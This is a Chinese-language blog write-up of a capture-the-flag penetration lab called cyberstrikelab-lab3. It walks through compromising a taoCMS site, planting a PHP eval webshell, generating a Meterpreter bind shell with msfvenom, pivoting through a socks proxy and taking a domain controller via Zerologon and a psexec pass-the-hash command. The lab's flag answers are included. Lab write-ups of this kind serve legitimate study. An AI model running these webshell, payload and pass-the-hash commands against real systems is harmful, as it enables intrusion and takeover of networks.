+++
series = ["内网渗透 学习记录"]
categories = ["内网渗透", "域渗透", "Web安全"]
tags = ["内网渗透", "域渗透", "Web安全"]
description = "靶机"
title = "cyberstrikelab-lab3"
date = 2026-08-24T09:13:17+08:00
draft = false
pin = false
+++
# flag1

192.168.10.10

端口扫描

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260707235736557.png)

发现3590 端口  尝试访问

发现是taocms

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260707235825777.png)
点击右下角管理  进行cms 管理页面

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708000006877.png)

访问源码 发现账号密码提示    

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260707235952276.png)

尝试登录    admin   tao   发现登录成功

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708000047425.png)
尝试用 nday  获取flag


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708000417001.png)

然后获取到flag

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708000504718.png)

go-flag{IpbKNIOigmnsuwY3}

# flag2

拿nday，rce，修改index.php  保存

```c
<?php
@eval($_POST[cmd]);

?>

```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708000737589.png)

蚁剑连接

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708000849389.png)

发现是双网卡  存在  10 段 和  20段  其中  10主机  权限很高

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708000948879.png)

这里我们用msf 木马进行正向上线   


```c
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o 4444.exe

use exploit/multi/handler  # 启用监听模块  
  
set payload windows/x64/meterpreter/bind_tcp  # 匹配生成木马时的payload``  
  
set RHOST 192.168.10.10  # 目标服务器IP地址

run
```

发现已经弹过来了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708173323593.png)

上传fscan

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708173642450.png)

扫描 20 网端

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708173837630.png)

发现

扫描结果如下：
（1）192.168.20.10 存活
（2）192.168.20.20 存活
（3）192.168.20.30 存活且为域控

对 20 主机进行端口扫描

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708174033589.png)

添加路由

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708174157861.png)

添加socks代理   如果不行的话添加下面的  有点卡

```c
msf auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0 msf   允许所有端口通行auxiliary(server/socks_proxy) > run

关闭防火墙啥的
sudo ufw disable
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708191355973.png)

然后访问   192.168.20.20:8055

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708191725187.png)

发现没有拿nday 扫出东西，回到题目  说木马已经在主页上

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708191834980.png)

使用工具进行爆破一句话木马的密码[https://github.com/theLSA/awBruter/tree/master](https://github.com/theLSA/awBruter/tree/master)

发现密码是 admin123

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708194515714.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708194715239.png)

找到了flag 

go-flag{C2AoW93mioh5XYQg}
# flag3


继续上线msf，hashdump 然后进行pth攻击192.168.20.30机器，但是不稳定太卡了

这里采用  zerologon  漏洞 获取到  hash

然后进行横向

```c
psexec.py -hashes :f349636281150c001081894de72b4e2b cyberstrikelab.com/administrator@192.168.20.30
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260708194656876.png)

go-flag{ueoJt7eB6AQL8OpL}

